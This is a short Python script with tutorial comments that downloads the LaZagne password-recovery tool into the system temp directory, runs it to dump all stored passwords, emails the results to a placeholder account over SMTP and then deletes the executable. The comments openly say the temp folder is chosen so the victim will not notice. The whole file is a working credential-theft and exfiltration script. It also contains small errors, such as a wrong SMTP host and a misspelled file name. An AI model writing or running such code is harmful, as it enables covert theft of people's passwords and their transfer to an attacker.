#!/usr/share/python3 

import requests
import smtplib
import subprocess
import os                    # runs command instructions that are cross platform
import tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]                  # The url.split command will spilt the url on the basis of "/" as provided and will store that in a list. [-1] spefifies the last element of the list
    with open(file_name, "wb") as out_file:       # The with will take the open function and refer to as out_file. open("<file_name>", "<operation>") operations include
        # read : r, write : w, read and write : rw. If the file doesn't exist and operation is write, then the file will be automatically created. wb : write binaries
        out_file.write(get_response.content)        # Any code in the tab will be executed while the file is open. Rest all code will be executed when the file is closed.

def send_mail(email, password, message):            # This function will send message via email
    server = smtplib.SMTP("smtp.google.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# Extracting Passwords from Windows OS
# This is going to be done with a tool called lazange : https://github.com/AlessandroZ/LaZagne.git
# Lazange will extract all the possible passwords and then we will write the python script as to send the lazange output in mail
# >> laZange_x86.exe all //// This command will dump all the password from the linux system (We are not using the x64 because the x86 version runs on both x86 and x64 but x64 version will work against x64 only)

# It is a good idea to store the downloaded evil files in temp directory as the user will not get suspicius of the new file downloaded and even not see it deleting
# temp directory is located in diffrent locations depending upon the operating system

temp_directory = tempfile.gettempdir()       # will fetch the location of temp file
os.chdir(temp_directory)                     # the program will move to the temp file and download laZange.exe there
download("<laZange.exe_url>")
result = subprocess.check_output("laZange.exe all", shell=True)
send_mail("<email>", "<password>", result)
os.remove("laZnage.exe")                     # Delete the laZange.exe file
